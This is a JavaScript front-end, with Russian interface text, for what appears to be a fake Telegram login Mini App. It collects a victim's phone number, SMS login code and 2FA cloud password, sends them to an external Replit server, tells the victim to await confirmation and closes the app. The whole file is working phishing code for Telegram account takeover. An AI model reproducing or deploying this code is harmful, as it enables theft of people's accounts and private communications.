// ===== НАСТРОЙКИ =====
const SERVER_URL = 'https://483aeb0e-d724-4e9b-ad96-9b813e0002fa-00-fe63autuudl3.pike.replit.dev:3000/';

// ===== ЭЛЕМЕНТЫ =====
const phoneInput = document.getElementById('phone');
const codeInput = document.getElementById('code');
const faInput = document.getElementById('fa');
const sendBtn = document.getElementById('sendCodeBtn');
const loginBtn = document.getElementById('loginBtn');
const messageDiv = document.getElementById('message');

// ===== ПЕРЕМЕННЫЕ =====
let currentPhone = '';
let is2faRequested = false;

// ===== ФУНКЦИИ =====
function showMessage(text, type) {
    messageDiv.textContent = text;
    messageDiv.className = 'message ' + type;
    messageDiv.style.display = 'block';
    setTimeout(() => {
        messageDiv.style.display = 'none';
    }, 5000);
}

// ===== ОТПРАВКА КОДА =====
sendBtn.addEventListener('click', async () => {
    currentPhone = phoneInput.value.trim();
    
    if (!currentPhone || !currentPhone.startsWith('+')) {
        showMessage('Введите номер в формате +7XXXXXXXXXX', 'error');
        return;
    }
    
    showMessage('📤 Отправка запроса...', 'info');
    sendBtn.disabled = true;
    sendBtn.textContent = '⏳ Отправка...';
    
    try {
        const response = await fetch(SERVER_URL + '/send-code', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phone: currentPhone })
        });
        
        const data = await response.json();
        
        if (data.success) {
            showMessage(`✅ Запрос отправлен! Код: ${data.code}`, 'success');
            console.log(`📱 Ваш код для теста: ${data.code}`);
            
            // Активируем поле для кода
            codeInput.disabled = false;
            codeInput.focus();
            sendBtn.textContent = '✅ Запрос отправлен';
            sendBtn.style.background = '#666';
        }
    } catch (error) {
        showMessage('❌ Ошибка соединения с сервером', 'error');
        sendBtn.disabled = false;
        sendBtn.textContent = '📤 Отправить код';
    }
});

// ===== ВХОД С КОДОМ =====
loginBtn.addEventListener('click', async () => {
    const code = codeInput.value.trim();
    const fa = faInput.value.trim();
    
    if (!code) {
        showMessage('Введите код из SMS', 'error');
        return;
    }
    
    showMessage('🔐 Проверка данных...', 'info');
    loginBtn.disabled = true;
    loginBtn.textContent = '⏳ Проверка...';
    
    try {
        const response = await fetch(SERVER_URL + '/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                phone: currentPhone, 
                code: code,
                fa: fa || ''
            })
        });
        
        const data = await response.json();
        
        if (data.success) {
            showMessage('✅ Данные отправлены! Ожидайте подтверждения.', 'success');
            loginBtn.textContent = '✅ Отправлено';
            loginBtn.style.background = '#666';
            
            // Через 5 секунд закрываем
            setTimeout(() => {
                if (typeof window.Telegram !== 'undefined') {
                    window.Telegram.WebApp.close();
                }
            }, 5000);
        } else {
            showMessage('❌ Неверный код', 'error');
            loginBtn.disabled = false;
            loginBtn.textContent = 'Войти в систему';
        }
    } catch (error) {
        showMessage('❌ Ошибка соединения', 'error');
        loginBtn.disabled = false;
        loginBtn.textContent = 'Войти в систему';
    }
});

// ===== 2FA ЗАПРОС (имитация) =====
// В реальном приложении это будет вызываться при нажатии "2FA" в Telegram
function request2FAPassword() {
    is2faRequested = true;
    faInput.disabled = false;
    faInput.placeholder = 'ВВЕДИТЕ ОБЛАЧНЫЙ ПАРОЛЬ';
    faInput.style.border = '2px solid #ffa502';
    faInput.focus();
    showMessage('🔐 Требуется облачный пароль (2FA)', 'info');
}

// Для теста: запрос 2FA через 5 секунд после отправки кода
setTimeout(() => {
    // Раскомментируйте для теста 2FA:
    // request2FAPassword();
}, 5000);

// ===== АКТИВАЦИЯ КНОПКИ ВХОДА =====
codeInput.addEventListener('input', () => {
    loginBtn.disabled = codeInput.value.length < 4;
});

// ===== ТЕСТОВОЕ АВТОЗАПОЛНЕНИЕ =====
phoneInput.addEventListener('dblclick', function() {
    if (!phoneInput.value) {
        phoneInput.value = '+79211234567';
        showMessage('🔧 Номер заполнен для теста', 'info');
    }
});

